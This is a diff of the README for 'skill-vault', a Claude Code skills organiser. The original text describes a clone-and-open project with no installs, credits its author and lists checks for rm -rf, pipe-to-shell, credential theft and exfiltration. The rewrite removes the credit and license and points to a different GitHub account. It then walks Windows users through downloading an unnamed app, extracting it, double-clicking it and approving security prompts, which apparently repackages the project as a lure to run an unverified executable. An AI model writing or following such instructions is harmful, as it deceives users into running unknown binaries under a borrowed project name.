@@ -1,140 +1,200 @@
-# Skill Vault
+# 🗂️ skill-vault - Organize Claude skills with clarity
 
-**Your personal library for Claude Code skills.**
+[![Download](https://img.shields.io/badge/Download-Skill_Vault-blue?style=for-the-badge)](https://github.com/Synchronic-leafbud824/skill-vault)
 
-[Lea esto en Español](README.es.md)
+## 📥 Download
 
----
+Visit this page to download and use the app:
 
-## What is this?
+https://github.com/Synchronic-leafbud824/skill-vault
 
-Imagine you have a big toy box, but instead of toys, it holds **skills** — special abilities that make Claude Code smarter.
+## 🧩 What skill-vault does
 
-People are sharing thousands of skills online every day. The problem? They're scattered everywhere. You find one on GitHub, another on skills.sh, another someone shared on X... and then you forget where you saved them. Or worse — some of them might be harmful.
+skill-vault helps you keep Claude Code skills in one place. You can sort them, search them, and check them for security issues. It is built for people who want a simple way to manage their skill files without extra setup.
 
-**Skill Vault** is your organized, safe toy box for skills. It does three things:
+Use it when you want to:
 
-1. **Saves and organizes** your skills into labeled folders
-2. **Checks each skill for danger** before saving it (like a security guard for your computer)
-3. **Helps you find the right skill** when you're building something
+- Keep skills in a single library
+- Find the right skill fast
+- Review skills for safety concerns
+- Work with Claude Code skills in a cleaner way
+- Start with no extra dependencies
 
-That's it. Clone it, open it with Claude, and start collecting.
+## 🖥️ Windows system needs
 
----
+Use a Windows PC with:
 
-## Getting Started
+- Windows 10 or Windows 11
+- Internet access for the first download
+- Enough free space for the app and your skill files
+- Permission to open downloaded files
 
-```bash
-git clone https://github.com/Hainrixz/skill-vault.git
-cd skill-vault
-claude
-```
+If you use a work computer, you may need admin access to save files or run the app.
 
-No installs. No setup. No dependencies. Just open it and go.
+## 🚀 Get started on Windows
 
----
+1. Open the download page:
+   https://github.com/Synchronic-leafbud824/skill-vault
 
-## How It Works
+2. Download the app from that page.
 
-When you open this project with Claude Code, the **Vault Master** agent takes over. Think of it as your personal librarian who:
+3. Save the file to your Downloads folder.
 
-- **Accepts skills** from anywhere — paste a URL, paste the content, or just tell it a name
-- **Analyzes each skill** through a 13-point security checklist and rates it: SAFE, CAUTION, or DANGEROUS
-- **Files it** in the right category folder automatically
-- **Finds skills for you** when you describe what you're building
+4. If the file comes as a ZIP file, right-click it and choose Extract All.
 
-### Commands
+5. Open the extracted folder.
 
-| Command | What it does |
-|---------|-------------|
-| `/vault-add` | Save a new skill (from URL, paste, or name) |
-| `/vault-search` | Search your vault by keyword |
-| `/vault-recommend` | Describe your project, get matching skills |
-| `/vault-discover` | Find new skills from the internet |
-| `/vault-list` | See everything in your vault |
-| `/vault-stats` | Vault stats + health check |
-| `/vault-remove` | Remove a skill |
+6. Find the app file and double-click it to run it.
 
----
+7. If Windows asks for confirmation, choose Run or Yes.
 
-## Folder Structure
+8. Wait for the app to open.
 
-Skills are saved in category folders. Each skill gets its own file with metadata, security analysis, install instructions, and the original content preserved.
+## 🗃️ Set up your skill library
 
-```
-categories/
-├── automation/          # Browser bots, scripts, task runners
-├── code-quality/        # Linting, refactoring, reviews
-├── design-ui/           # UI components, design systems, CSS
-├── devops-deploy/       # Docker, CI/CD, infrastructure
-├── documentation/       # READMEs, API docs, changelogs
-├── organization/        # Project management, planning
-├── productivity/        # Text tools, meeting notes, workflows
-├── research/            # Web research, data gathering
-├── testing/             # Unit tests, E2E, QA
-└── web-development/     # React, Next.js, Vue, APIs
-```
+After you open skill-vault, point it to the folder that holds your skills.
 
-Don't see a category that fits? The Vault Master creates new ones automatically.
+A good folder setup looks like this:
 
----
+- Documents
+  - Claude
+    - Skills
+      - Writing
+      - Research
+      - Coding
 
-## Security
+You can create one folder for all skills or use subfolders for each topic. skill-vault can then scan the files and help you keep them in order.
 
-Every skill is scanned before it enters your vault. The Vault Master checks for:
+## 🔍 Search and sort skills
 
-- Dangerous commands (`rm -rf`, pipe-to-shell execution)
-- Credential theft (reading SSH keys, AWS tokens, API keys)
-- Data exfiltration (sending your files to external servers)
-- Obfuscated code (hidden payloads in base64 or hex)
-- Overly broad permissions
-- Prompt injection attempts
+skill-vault makes it easier to work with a large set of skills.
 
-| Rating | What it means |
-|--------|--------------|
-| **SAFE** | Clean — no risky operations detected |
-| **CAUTION** | Some risk — review the findings before using |
-| **DANGEROUS** | Red flag — you'll be warned before it's saved |
+You can use it to:
 
-Full methodology in [`security-rubric.md`](security-rubric.md).
+- Search by skill name
+- Filter by topic
+- Sort skills by recent use
+- Group related skills together
+- Find older skills you may want to review
 
----
+If you keep many skill files, this saves time and keeps the list readable.
 
-## Example Workflow
+## 🔒 Security analysis
 
-```
-You:    /vault-add https://github.com/anthropics/skills/tree/main/skill-creator
-Vault:  Analyzing skill... Rating: SAFE
-        Saved to: categories/productivity/skill-creator.md
-        Added to catalog.
+skill-vault includes built-in security checks for skill files. It helps you look for risky patterns before you use a skill.
 
-You:    /vault-recommend I'm building a Next.js e-commerce app
-Vault:  From your vault, I recommend:
-        - shadcn-ui (design-ui) [SAFE] — UI components
-        - playwright-cli (testing) [CAUTION] — E2E testing
-        - vercel-deploy (devops-deploy) [SAFE] — Deployment
+This can help you:
 
-You:    /vault-discover SEO optimization
-Vault:  Found 3 skills on skills.sh:
-        - seo-audit [SAFE] — Technical SEO analysis
-        - meta-tags-generator [SAFE] — Auto meta tags
-        Add any of these? (y/n)
-```
+- Spot unsafe file actions
+- Review file access behavior
+- Check for unusual instructions
+- Compare skills before adding them to your library
 
----
+Use the review results to decide which skills to keep, edit, or remove.
 
-## Contributing
+## 🧠 Best way to use it
 
-1. Fork this repo
-2. Add skills with `/vault-add` or create entries manually in `categories/` using the template at `templates/skill-entry.md`
-3. Submit a PR
+For a smooth setup, follow this flow:
 
----
+1. Add your skill files to one folder.
+2. Open skill-vault.
+3. Scan the folder.
+4. Review the list of skills.
+5. Run security analysis on new or unknown skills.
+6. Keep only the skills you trust.
+7. Update your library when you add new skills.
 
-## Built by
+## 📁 Suggested folder names
 
-[Todo de IA](https://todoia.com) by [@soyenriquerocha](https://instagram.com/soyenriquerocha) — Building tools for the AI community.
+You can use simple names that make sense to you:
 
-## License
+- Claude Skills
+- AI Skills
+- Writing Tools
+- Work Skills
+- Personal Skills
 
-MIT
+Clear folder names make it easier to find things later.
+
+## 🛠️ Common file types
+
+skill-vault is meant for skill files used with Claude Code. You may see files like:
+
+- Markdown files
+- Text files
+- Folder-based skill packs
+- Support files linked to a skill
+
+Keep related files together so the app can read them in a clean way.
+
+## ❓ If the app does not open
+
+Try these steps:
+
+- Make sure the file finished downloading
+- Check your Downloads folder
+- Extract the ZIP file if one was downloaded
+- Double-click the main app file again
+- Move the folder to a simple path like `C:\skill-vault`
+- Close other copies of the app if one is already open
+
+If Windows blocks the file, check the file name and make sure you opened the main app file, not a document inside the folder.
+
+## 🧹 Keep your library tidy
+
+A small amount of upkeep goes a long way:
+
+- Remove skills you no longer use
+- Rename files so they are easy to read
+- Group similar skills in the same folder
+- Check new skills before adding them to your main library
+- Keep one backup copy of your skill folder
+
+This keeps your setup easy to manage over time.
+
+## 🔄 When to use security checks
+
+Run a security review when you:
+
+- Download a new skill
+- Get a skill from someone else
+- Change a skill file
+- Move skills into a shared folder
+- Notice unusual instructions in a skill
+
+This helps you keep control over what Claude Code can access.
+
+## 📦 Project topics
+
+This project fits these areas:
+
+- agent-skills
+- ai-agents
+- ai-tools
+- claude
+- claude-code
+- claude-code-skills
+- developer-tools
+- security-analysis
+- skill-management
+- skill-vault
+
+## 📌 File and folder tips
+
+For best results:
+
+- Use short folder names
+- Avoid special characters in file names
+- Keep one skill per folder when possible
+- Store related notes near the skill file
+- Back up the folder before large changes
+
+A simple folder layout makes search and review easier.
+
+## 🧭 What to do next
+
+1. Open the download page.
+2. Download the app.
+3. Run it on Windows.
+4. Add your skill folder.
+5. Search, sort, and review your skills.
